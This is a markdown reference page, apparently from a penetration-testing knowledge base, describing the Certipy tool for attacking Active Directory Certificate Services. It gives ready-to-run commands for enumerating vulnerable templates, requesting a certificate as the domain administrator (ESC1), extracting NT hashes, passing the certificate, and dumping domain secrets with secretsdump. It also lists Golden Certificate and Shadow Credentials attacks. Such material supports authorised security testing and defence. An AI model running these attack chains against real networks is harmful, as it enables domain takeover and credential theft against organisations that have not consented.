---
title: "Certipy"
category: "tool"
tags:
  - active-directory
  - adcs
  - certificate-attacks
  - pkinit
  - kerberos
sources:
  - type: github
    url: "https://github.com/ly4k/Certipy"
  - type: pypi
    url: "https://pypi.org/project/certipy-ad/"
last_updated: "2025-12-27"
---

# Certipy

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Common Commands](#common-commands)
- [Authentication Methods](#authentication-methods)
- [Documentation Files](#documentation-files)

## Overview

Certipy is a Python tool for enumerating and abusing Active Directory Certificate Services (AD CS). It can identify vulnerable certificate templates, request and forge certificates, and use certificates for authentication to obtain NT hashes or TGTs.

**Key Capabilities:**
- Enumerate AD CS infrastructure and certificate templates
- Identify vulnerable templates (ESC1-ESC11)
- Request certificates with subject alternative names
- Authenticate using certificates (PKINIT)
- Retrieve NT hashes via U2U and PKINIT
- Perform Golden Certificate attacks
- Shadow Credentials attacks

## Installation

```bash
# Install via pip (recommended)
pip install certipy-ad

# Install from source
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .

# Kali Linux
sudo apt install certipy-ad
```

**Note:** The package name is `certipy-ad` (not `certipy`) to avoid conflicts.

## Quick Start

### Enumerate AD CS

```bash
# Find all certificate authorities and templates
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1

# Find vulnerable templates only
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# Output as text (default is JSON and BloodHound)
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -text
```

### Request a Certificate (ESC1)

```bash
# Request certificate with UPN of target user
certipy req -u user@domain.local -p 'Password123' -ca 'CORP-CA' \
    -template 'VulnerableTemplate' -upn administrator@domain.local
```

### Authenticate with Certificate

```bash
# Authenticate and get NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Authenticate and get TGT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -no-hash
```

### Pass-the-Certificate

```bash
# Use with Impacket tools
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass dc01.domain.local
```

## Common Commands

| Command | Description |
|---------|-------------|
| `certipy find` | Enumerate AD CS, find CAs and templates |
| `certipy req` | Request a certificate from a CA |
| `certipy auth` | Authenticate using a certificate (PKINIT) |
| `certipy cert` | Manage certificates (convert, extract, etc.) |
| `certipy ca` | Manage CA (backup, add officer, etc.) |
| `certipy template` | Manage certificate templates |
| `certipy relay` | NTLM relay to AD CS web endpoints |
| `certipy shadow` | Shadow Credentials attack |
| `certipy forge` | Forge certificates (Golden Certificate) |
| `certipy ptt` | Pass-the-ticket (inject into ccache) |
| `certipy account` | Create/delete machine account |

## Authentication Methods

```bash
# Password authentication
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1

# NTLM hash authentication
certipy find -u user@domain.local -hashes :aad3b435b51404eeaad3b435b51404ee -dc-ip 10.10.10.1

# Kerberos authentication (ccache)
export KRB5CCNAME=user.ccache
certipy find -u user@domain.local -k -dc-ip 10.10.10.1

# Kerberos with specific KDC
certipy find -u user@domain.local -k -dc-ip 10.10.10.1 -target dc01.domain.local
```

## Output Files

Certipy generates several output files:

| File | Description |
|------|-------------|
| `*.json` | Detailed enumeration results |
| `*_Certipy.zip` | BloodHound CE compatible data |
| `*.pfx` | Certificate + private key (PKCS#12) |
| `*.ccache` | Kerberos TGT cache file |
| `*.kirbi` | Kerberos ticket (Mimikatz format) |

## Documentation Files

| File | Description |
|------|-------------|
| [README.md](README.md) | This file - overview and quick reference |
| [attacks.md](attacks.md) | AD CS attack techniques (ESC1-ESC11, Golden Cert) |
| [enumeration.md](enumeration.md) | Enumeration and authentication techniques |

## Quick Reference

### ESC1 - Full Attack Chain

```bash
# 1. Find vulnerable templates
certipy find -u user@domain.local -p 'Pass' -dc-ip 10.10.10.1 -vulnerable

# 2. Request certificate as Domain Admin
certipy req -u user@domain.local -p 'Pass' -ca 'CORP-CA' \
    -template 'VulnTemplate' -upn administrator@domain.local

# 3. Authenticate and get NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# 4. Use hash with Impacket
secretsdump.py -hashes :hash domain.local/administrator@dc01
```

## References

- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [Certified Pre-Owned Whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [AD CS Attack Paths in BloodHound](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b0a64)
